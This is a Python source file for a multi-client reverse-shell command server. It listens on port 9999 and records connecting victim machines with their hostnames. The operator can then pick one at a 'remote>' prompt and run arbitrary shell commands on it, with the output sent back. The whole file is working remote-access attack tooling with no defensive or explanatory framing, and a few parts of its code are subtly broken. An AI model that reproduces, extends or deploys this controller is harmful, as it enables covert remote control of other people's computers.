import socket
import threading
import time
import sys
from queue import Queue
import struct
import signal

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()

COMMANDS = {'help': ['Shows this help'],
            'list': ['Lists connected clients'],
            'select': ['Selects a client by its index. Takes index as a parameter'],
            'quit': ['Stops current connection with a client. To be used when client is selected'],
            'shutdown': ['Shuts server down'], }


def print_help():
    for cmd, v in COMMANDS.items():
        print("{0}:\t{1}".format(cmd, v[0]))
    return


def recv_all(conn, n):
    data = b''
    while len(data) < n:
        packet = conn.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data


def read_command_output(conn):
    """ Read message length and unpack it into an integer
    :param conn:
    """
    raw_msg = recv_all(conn, 4)
    if not raw_msg:
        return None
    msg_len = struct.unpack('>I', raw_msg)[0]
    # Read the message data
    return recv_all(conn, msg_len)


class MultiServer(object):

    def __init__(self):
        self.host = ''  # Enter the IP Address of your local computer
        self.port = 9999
        self.socket = None
        self.all_connections = []
        self.all_addresses = []

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self):
        print('\nQuitting gracefully')
        for conn in self.all_connections:
            try:
                conn.shutdown(2)
                conn.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
                # continue
        self.socket.close()
        sys.exit(0)

    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))
            sys.exit(1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return

    """ Bind socket and port together for connection from client """

    def socket_bind(self):
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as e:
            print("Socket binding error: " + str(e))
            time.sleep(5)
            self.socket_bind()
        return

    def accept_connections(self):
        """ Accept connections from multiple clients and save to list """
        for c in self.all_connections:
            c.close()
        self.all_connections = []
        self.all_addresses = []
        while 1:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)
                client_hostname = conn.recv(1024).decode("utf-8")
                address = address + (client_hostname,)
            except Exception as e:
                print('Error accepting connections: %s' % str(e))
                continue
            self.all_connections.append(conn)
            self.all_addresses.append(address)
            print('\nConnection has been established: {0} ({1})'.format(address[-1], address[0]))
        return

    def start_turtle(self):
        """ Interactive prompt for sending commands remotely """
        while True:
            cmd = input('remote> ')
            if cmd == 'list':
                self.list_connections()
                continue
            elif 'select' in cmd:
                target, conn = self.get_target(cmd)
                if conn is not None:
                    self.send_target_commands(target, conn)
            elif cmd == 'shutdown':
                queue.task_done()
                queue.task_done()
                print('Server shutdown')
                break
            elif cmd == 'help':
                print_help()
            elif cmd == '':
                pass
            else:
                print('Command not recognized')
        return

    def list_connections(self):
        """ List all connections """
        results = ''
        for i, conn in enumerate(self.all_connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except self as e:
                del e.all_connections[i]
                del e.all_addresses[i]
                continue
            results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(
                self.all_addresses[i][1]) + '   ' + str(self.all_addresses[i][2]) + '\n'
        print('----- Clients -----' + '\n' + results)
        return

    def get_target(self, cmd):
        target = cmd.split(' ')[-1]
        try:
            target = int(target)
        except Exception as e:
            print('Client index should be an integer. Error: %s' % str(e))
            return None, None
        try:
            conn = self.all_connections[target]
        except IndexError:
            print('Not a valid selection')
            return None, None
        print("You are now connected to " + str(self.all_addresses[target][2]))
        return target, conn

    def send_target_commands(self, target, conn):
        conn.send(str.encode(" "))
        cwd_bytes = read_command_output(conn)
        cwd = str(cwd_bytes, "utf-8")
        print(cwd, end="")
        while True:
            try:
                cmd = input()
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    cmd_output = read_command_output(conn)
                    client_response = str(cmd_output, "utf-8")
                    print(client_response, end="")
                if cmd == 'quit':
                    break
            except Exception as e:
                print("Connection was lost %s" % str(e))
                break
        del self.all_connections[target]
        del self.all_addresses[target]
        return


# ---------------------------------------------Threading-------------------------------------------------------#


def create_workers():
    """ Create worker threads (will die when main exits) """
    server = MultiServer()
    server.register_signal_handler()
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()
    return


def work(server):
    while True:
        x = queue.get()
        if x == 1:
            server.socket_create()
            server.socket_bind()
            server.accept_connections()
        if x == 2:
            server.start_turtle()
        queue.task_done()


def create_jobs():
    """ Each list item is a new job """
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
    return


def main():
    create_workers()
    create_jobs()


# ---------------------------------------------------------Driver----------------------------------------------#


if __name__ == '__main__':
    main()
